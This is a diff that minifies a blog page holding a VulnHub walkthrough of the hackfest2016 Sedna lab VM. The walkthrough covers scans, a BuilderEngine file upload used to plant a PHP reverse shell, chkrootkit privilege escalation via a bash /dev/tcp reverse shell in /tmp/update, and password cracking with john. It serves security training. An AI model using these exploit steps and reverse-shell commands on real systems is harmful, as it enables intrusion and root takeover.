@@ -1,45 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
-  <head>
-    <meta charset="utf-8"/>
-    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
-    <meta name="description" content="Personal Weblog"/>
-    <meta content="width=device-width, initial-scale=1" name="viewport"/>
-    <title>Mannthan</title>
-    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
-    <script src="/static/js/highlight.min.js"></script>
-    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
-    <script charset="UTF-8" src="/static/js/go.min.js"></script>
-    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/style.md.css"> -->
-    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
-    <link rel="stylesheet" href="/static/css/github-gist.min.css">
-    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
-   </head>
-  <body>
-    <div class="header">
-      <table>
-        <tr>
-          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
-          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
-          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
-          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
-        </tr>
-      </table>
-    </div>
-    <div class="body">
-          <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] hackfest2016: Sedna</h1>
-                  <p><a href="/posts/20190918_vulnhub-quaoar.html"> « </a>📅 published on <code>19/Sep/2019</code><a href="/posts/20190920_vulnhub-vulnix.html"> » </a></p>
-                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
-<p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/hackfest2016-sedna,181/">hackfest2016: Sedna</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
-<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_sedna/killchain.png" /></p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
-<p class="nested">1. Here's the Nmap scan result:  </p>
-<pre class="nested"><code># Nmap 7.70 scan initiated Wed Sep 18 18:02:06 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.sedna/results/192.168.92.176/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.sedna/results/192.168.92.176/scans/xml/_quick_tcp_nmap.xml 192.168.92.176
+<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>Mannthan</title><link href=/static/images/mannthan-32x32.png sizes=32x32 rel=icon type=image/png><script src=/static/js/highlight.min.js></script><script src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script><link rel=stylesheet href=/static/css/github-gist.min.css><link rel=stylesheet type=text/css href=/static/css/style.md.css media=screen></head><body><div class=header><table><tr><td><a href=/index.html style="color:#fe4164; font-size:14pt;">🏡 Home </a></td><td><a href=/archive.html style="color:#f90; font-size:14pt;">💾 Archive </a></td><td><a href=/tags.html style="color:#69359c; font-size:14pt;">🔖 Tags </a></td><td><a href=/stats.html style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td></tr></table></div><div class=body><h1 class="h1 collapsible" onclick=toggle(this);>[VulnHub] hackfest2016: Sedna</h1><p><a href=/posts/20190918_vulnhub-quaoar.html> « </a>📅 published on <code>19/Sep/2019</code><a href=/posts/20190920_vulnhub-vulnix.html> » </a></p><h2 class="h2 collapsible" onclick=toggle(this);>Overview</h2><p class=nested>This is a writeup for VulnHub VM <a href=https://www.vulnhub.com/entry/hackfest2016-sedna,181/ >hackfest2016: Sedna</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p><p class=nested><img alt=writeup.overview.killchain src=/static/files/posts_vulnhub_sedna/killchain.png></p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #1: Enumeration</h2><p class=nested>1. Here's the Nmap scan result: </p><pre class=nested><code># Nmap 7.70 scan initiated Wed Sep 18 18:02:06 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.sedna/results/192.168.92.176/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.sedna/results/192.168.92.176/scans/xml/_quick_tcp_nmap.xml 192.168.92.176
 Nmap scan report for 192.168.92.176
 Host is up, received arp-response (0.0036s latency).
 Scanned at 2019-09-18 18:02:07 PDT for 27s
@@ -263,10 +222,7 @@ Host script results:
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Wed Sep 18 18:02:34 2019 -- 1 IP address (1 host up) scanned in 27.71 seconds
-</code></pre>
-
-<p class="nested">2. From the Nikto scan report we see that there is a <code>license.txt</code> file that could be interesting. We take a look at the file and find <code>Copyright (c) 2012 - 2015 BuilderEngine / Radian Enterprise Systems Limited.</code> message in it indicating installation of <code>BuilderEngine</code> application:  </p>
-<pre class="nested"><code>- Nikto v2.1.6
+</code></pre><p class=nested>2. From the Nikto scan report we see that there is a <code>license.txt</code> file that could be interesting. We take a look at the file and find <code>Copyright (c) 2012 - 2015 BuilderEngine / Radian Enterprise Systems Limited.</code> message in it indicating installation of <code>BuilderEngine</code> application: </p><pre class=nested><code>- Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.92.176
 + Target Hostname:    192.168.92.176
@@ -291,11 +247,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 + End Time:           2019-09-18 18:03:34 (GMT-7) (57 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-</code></pre>
-
-<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
-<h4 class="h4 collapsible" onclick="toggle(this);">Open Ports</h4>
-<pre class="nested"><code>22/tcp     |  ssh          |  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
+</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Findings</h3><h4 class="h4 collapsible" onclick=toggle(this);>Open Ports</h4><pre class=nested><code>22/tcp     |  ssh          |  OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)
 53/tcp     |  domain       |  ISC BIND 9.9.5-3 (Ubuntu Linux)
 80/tcp     |  http         |  Apache httpd 2.4.7 ((Ubuntu))
 110/tcp    |  pop3         |  Dovecot pop3d
@@ -308,29 +260,12 @@ Service detection performed. Please report any incorrect results at https://nmap
 995/tcp    |  ssl/pop3     |  Dovecot pop3d
 8080/tcp   |  http         |  Apache Tomcat/Coyote JSP engine 1.1
 40176/tcp  |  status       |  1 (RPC #100024)
-</code></pre>
-
-<h4 class="h4 collapsible" onclick="toggle(this);">Files</h4>
-<pre class="nested"><code>http://192.168.92.176/license.txt
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
-<p class="nested">1. There's an arbitrary file upload <a href="https://www.exploit-db.com/exploits/40390">exploit</a> for <code>BuilderEngine</code> that we can use:  </p>
-<pre class="nested"><code>searchsploit builderengine
-</code></pre>
-
-<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_sedna/screenshot02a.png" />  </p>
-<p class="nested">2. The exploit needs an update to point to the right <code>BuilderEngine</code> url and then it can be used to <code>POST</code> a local file to the target server. We use this exploit to upload a PHP reverse shell, note the location of uploaded file, start a local <code>netcat</code> listener and trigger file execution to catch incoming reverse shell:  </p>
-<pre class="nested"><code>http://192.168.92.176/themes/dashboard/assets/plugins/jquery-file-upload/server/php/
+</code></pre><h4 class="h4 collapsible" onclick=toggle(this);>Files</h4><pre class=nested><code>http://192.168.92.176/license.txt
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2: Exploitation</h2><p class=nested>1. There's an arbitrary file upload <a href=https://www.exploit-db.com/exploits/40390>exploit</a> for <code>BuilderEngine</code> that we can use: </p><pre class=nested><code>searchsploit builderengine
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_vulnhub_sedna/screenshot02a.png> </p><p class=nested>2. The exploit needs an update to point to the right <code>BuilderEngine</code> url and then it can be used to <code>POST</code> a local file to the target server. We use this exploit to upload a PHP reverse shell, note the location of uploaded file, start a local <code>netcat</code> listener and trigger file execution to catch incoming reverse shell: </p><pre class=nested><code>http://192.168.92.176/themes/dashboard/assets/plugins/jquery-file-upload/server/php/
 nc -nlvp 9999
 http://192.168.92.176/files/php-reverse-shell.php
-</code></pre>
-
-<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_sedna/screenshot01.png" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.2.2" src="/static/files/posts_vulnhub_sedna/screenshot03.png" />  </p>
-<p class="nested"><img alt="writeup.exploitation.steps.2.3" src="/static/files/posts_vulnhub_sedna/screenshot04.png" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
-<pre class="nested"><code>www-data@Sedna&gt; id
+</code></pre><p class=nested><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_vulnhub_sedna/screenshot01.png> </p><p class=nested><img alt=writeup.exploitation.steps.2.2 src=/static/files/posts_vulnhub_sedna/screenshot03.png> </p><p class=nested><img alt=writeup.exploitation.steps.2.3 src=/static/files/posts_vulnhub_sedna/screenshot04.png> </p><h2 class="h2 collapsible" onclick=toggle(this);>Phase #2.5: Post Exploitation</h2><pre class=nested><code>www-data@Sedna&gt; id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 www-data@Sedna&gt;  
 www-data@Sedna&gt; uname
@@ -349,112 +284,25 @@ eth0  Link encap:Ethernet  HWaddr 00:0c:29:53:40:6e
 www-data@Sedna&gt;  
 www-data@Sedna&gt; users
 crackmeforpoints
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
-<p class="nested">1. While exploring <code>/var/www</code> directory we find the first flag:  </p>
-<pre class="nested"><code>cat /var/www/flag.txt
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_sedna/screenshot05.png" />  </p>
-<p class="nested">2. We look for presence of <code>chkrootkit</code> shell script and find at <code>/etc/chkrootkit/chkrootkit</code>:  </p>
-<pre class="nested"><code>find / -type f -name chkrootkit 2&gt;/dev/null
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>Phase #3: Privilege Escalation</h2><p class=nested>1. While exploring <code>/var/www</code> directory we find the first flag: </p><pre class=nested><code>cat /var/www/flag.txt
+</code></pre><p class=nested><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_vulnhub_sedna/screenshot05.png> </p><p class=nested>2. We look for presence of <code>chkrootkit</code> shell script and find at <code>/etc/chkrootkit/chkrootkit</code>: </p><pre class=nested><code>find / -type f -name chkrootkit 2&gt;/dev/null
 file /etc/chkrootkit/chkrootkit
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_sedna/screenshot05a.png" />  </p>
-<p class="nested">3. We find a local privilege escalation exploit for <code>chkrootkit</code> using <code>searchsploit</code> and look at steps to use this:  </p>
-<pre class="nested"><code>searchsploit chkrootkit
+</code></pre><p class=nested><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_vulnhub_sedna/screenshot05a.png> </p><p class=nested>3. We find a local privilege escalation exploit for <code>chkrootkit</code> using <code>searchsploit</code> and look at steps to use this: </p><pre class=nested><code>searchsploit chkrootkit
 searchsploit -x 33899
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_sedna/screenshot05b.png" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.3.2" src="/static/files/posts_vulnhub_sedna/screenshot05c.png" />  </p>
-<p class="nested">4. For the exploit to work, we create a <code>/tmp/update</code> file, assign executable permissions to it and add a Bash reverse shell command to it:  </p>
-<pre class="nested"><code>touch /tmp/update
+</code></pre><p class=nested><img alt=writeup.privesc.steps.3.1 src=/static/files/posts_vulnhub_sedna/screenshot05b.png> </p><p class=nested><img alt=writeup.privesc.steps.3.2 src=/static/files/posts_vulnhub_sedna/screenshot05c.png> </p><p class=nested>4. For the exploit to work, we create a <code>/tmp/update</code> file, assign executable permissions to it and add a Bash reverse shell command to it: </p><pre class=nested><code>touch /tmp/update
 chmod +x /tmp/update
 printf &quot;bash -i &gt;&amp; /dev/tcp/192.168.92.163/443 0&gt;&amp;1 \n&quot; &gt;/tmp/update
 cat /tmp/update
   bash -i &gt;&amp; /dev/tcp/192.168.92.163/443 0&gt;&amp;1
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_sedna/screenshot05d.png" />  </p>
-<p class="nested">5. Once <code>chkrootkit</code> shell script excutes via <code>cronjob</code>, it will also run <code>/tmp/update</code> file with <code>root</code> privileges giving us an elevated shell:  </p>
-<pre class="nested"><code>nc -nlvp 443
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.5.1" src="/static/files/posts_vulnhub_sedna/screenshot06.png" />  </p>
-<p class="nested">6. We then get the second flag at <code>/root/flag.txt</code>:  </p>
-<pre class="nested"><code>cat /root/flag.txt
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.6.1" src="/static/files/posts_vulnhub_sedna/screenshot07.png" />  </p>
-<p class="nested">7. While exploring <code>/etc/tomcat7</code> directory we come across third flag:  </p>
-<pre class="nested"><code>cat /etc/tomcat7/tomcat-users.xml
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.7.1" src="/static/files/posts_vulnhub_sedna/screenshot08.png" />  </p>
-<p class="nested">8. To obtain fourth and final flag, we need to crack hash for user <code>crackmeforpoints</code>. We created a wordlist from <code>https://en.wikipedia.org/wiki/90377_Sedna</code> and tried bruteforcing but it failed. We then tried bruteforcing using the <code>rockyou.txt</code> wordlist but it didn't complete on time:  </p>
-<pre class="nested"><code>cewl -m 4 -w dict.txt &quot;https://en.wikipedia.org/wiki/90377_Sedna&quot;
+</code></pre><p class=nested><img alt=writeup.privesc.steps.4.1 src=/static/files/posts_vulnhub_sedna/screenshot05d.png> </p><p class=nested>5. Once <code>chkrootkit</code> shell script excutes via <code>cronjob</code>, it will also run <code>/tmp/update</code> file with <code>root</code> privileges giving us an elevated shell: </p><pre class=nested><code>nc -nlvp 443
+</code></pre><p class=nested><img alt=writeup.privesc.steps.5.1 src=/static/files/posts_vulnhub_sedna/screenshot06.png> </p><p class=nested>6. We then get the second flag at <code>/root/flag.txt</code>: </p><pre class=nested><code>cat /root/flag.txt
+</code></pre><p class=nested><img alt=writeup.privesc.steps.6.1 src=/static/files/posts_vulnhub_sedna/screenshot07.png> </p><p class=nested>7. While exploring <code>/etc/tomcat7</code> directory we come across third flag: </p><pre class=nested><code>cat /etc/tomcat7/tomcat-users.xml
+</code></pre><p class=nested><img alt=writeup.privesc.steps.7.1 src=/static/files/posts_vulnhub_sedna/screenshot08.png> </p><p class=nested>8. To obtain fourth and final flag, we need to crack hash for user <code>crackmeforpoints</code>. We created a wordlist from <code>https://en.wikipedia.org/wiki/90377_Sedna</code> and tried bruteforcing but it failed. We then tried bruteforcing using the <code>rockyou.txt</code> wordlist but it didn't complete on time: </p><pre class=nested><code>cewl -m 4 -w dict.txt &quot;https://en.wikipedia.org/wiki/90377_Sedna&quot;
 unshadow passwd shadow &gt;unshadowed ; john --rules --wordlist=./dict.txt unshadowed
 john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed
-</code></pre>
-
-<p class="nested"><img alt="writeup.privesc.steps.8.1" src="/static/files/posts_vulnhub_sedna/screenshot09.png" />  </p>
-<p class="nested"><img alt="writeup.privesc.steps.8.2" src="/static/files/posts_vulnhub_sedna/screenshot10.png" />  </p>
-<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
-<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
-<pre class="nested"><code>root:$6$sZyJlUny$OcHP9bd8dO9rAKAlryxUjnUbH0dxgZc2uCePZMUUKSeIdALUulXLQ1iDjoEQpvZI.HTHOHUkCR.m39Xrt........................
+</code></pre><p class=nested><img alt=writeup.privesc.steps.8.1 src=/static/files/posts_vulnhub_sedna/screenshot09.png> </p><p class=nested><img alt=writeup.privesc.steps.8.2 src=/static/files/posts_vulnhub_sedna/screenshot10.png> </p><h2 class="h2 collapsible" onclick=toggle(this);>Loot</h2><h3 class="h3 collapsible" onclick=toggle(this);>Hashes</h3><pre class=nested><code>root:$6$sZyJlUny$OcHP9bd8dO9rAKAlryxUjnUbH0dxgZc2uCePZMUUKSeIdALUulXLQ1iDjoEQpvZI.HTHOHUkCR.m39Xrt........................
 crackmeforpoints:$6$p22wX4fD$RRAamkeGIA56pj4MpM7CbrKPhShVkZnNH2NjZ8JMUP6Y/1upG.54kSph/HSP1LFcn4.2C11cF0R7Qmo..........................
-</code></pre>
-
-<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
-<pre class="nested"><code>tomcat: tomcat/submitthisforp.....
-</code></pre>
-
-<h3 class="h3 collapsible" onclick="toggle(this);">Flags</h3>
-<pre class="nested"><code>bfbb7e6e6e88d9ae66848b9ae.......
+</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Credentials</h3><pre class=nested><code>tomcat: tomcat/submitthisforp.....
+</code></pre><h3 class="h3 collapsible" onclick=toggle(this);>Flags</h3><pre class=nested><code>bfbb7e6e6e88d9ae66848b9ae.......
 a10828bee17db751de4b93661.......
-</code></pre>
-
-<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
-<ul class="nested">
-<li><a href="https://www.vulnhub.com/entry/hackfest2016-sedna,181/">https://www.vulnhub.com/entry/hackfest2016-sedna,181/</a>  </li>
-<li><a href="https://www.n00py.io/2017/03/vulnhub-walkthrough-hackfest2016-sedna/">https://www.n00py.io/2017/03/vulnhub-walkthrough-hackfest2016-sedna/</a>  </li>
-</ul>
-        <p style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
-                  <p style="text-align:center;">« <a href="/posts/20190918_vulnhub-quaoar.html">[VulnHub] hackfest2016: Quaoar...</a> « | » <a href="/posts/20190920_vulnhub-vulnix.html">[VulnHub] HackLAB: Vulnix...</a> »</p>
-            </div>
-    <script>hljs.initHighlightingOnLoad();</script>
-    <script>hljs.initLineNumbersOnLoad();</script>
-    <script>
-      function toggle(elem) {
-        elem.classList.toggle("expanded");
-        var ish2=false; var ish3=false; var ish4=false;
-        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }; if (elem.classList.contains("h4")) { ish4=true; }
-        console.log(elem); console.log(ish2); console.log(ish3); console.log(ish4);
-        var sibling = elem.nextElementSibling;
-        while (sibling) {
-          if (ish2 && sibling.classList.contains("h2")) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (ish4 && (sibling.classList.contains("h2") || sibling.classList.contains("h3") || sibling.classList.contains("h4"))) {
-            sibling.classList.toggle("active");
-            break;
-          }
-          if (sibling.classList.contains("collapsible")) {
-            sibling.classList.toggle("expanded");
-          }
-          sibling.classList.toggle("active");
-          sibling = sibling.nextElementSibling;
-        }
-      }
-    </script>
-    <div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div>
-  </body>
-</html>
+</code></pre><h2 class="h2 collapsible" onclick=toggle(this);>References</h2><ul class=nested><li><a href=https://www.vulnhub.com/entry/hackfest2016-sedna,181/ >https://www.vulnhub.com/entry/hackfest2016-sedna,181/</a> </li><li><a href=https://www.n00py.io/2017/03/vulnhub-walkthrough-hackfest2016-sedna/ >https://www.n00py.io/2017/03/vulnhub-walkthrough-hackfest2016-sedna/</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20190918_vulnhub-quaoar.html>[VulnHub] hackfest2016: Quaoar...</a> « | » <a href=/posts/20190920_vulnhub-vulnix.html>[VulnHub] HackLAB: Vulnix...</a> »</p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script><script>function toggle(s){s.classList.toggle("expanded");var t=!1,i=!1,a=!1;s.classList.contains("h2")&&(t=!0),s.classList.contains("h3")&&(i=!0),s.classList.contains("h4")&&(a=!0),console.log(s),console.log(t),console.log(i),console.log(a);for(var l=s.nextElementSibling;l;){if(t&&l.classList.contains("h2")){l.classList.toggle("active");break}if(i&&(l.classList.contains("h2")||l.classList.contains("h3"))){l.classList.toggle("active");break}if(a&&(l.classList.contains("h2")||l.classList.contains("h3")||l.classList.contains("h4"))){l.classList.toggle("active");break}l.classList.contains("collapsible")&&l.classList.toggle("expanded"),l.classList.toggle("active"),l=l.nextElementSibling}}</script><div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div></body></html>
